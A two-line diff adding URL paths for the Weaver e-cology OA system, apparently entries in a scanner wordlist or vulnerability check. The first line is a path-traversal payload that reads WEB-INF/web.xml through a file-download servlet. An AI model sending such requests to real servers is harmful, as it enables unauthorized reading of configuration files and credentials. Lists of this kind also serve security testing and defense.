@@ -1,0 +1,2 @@
+/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
+/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1
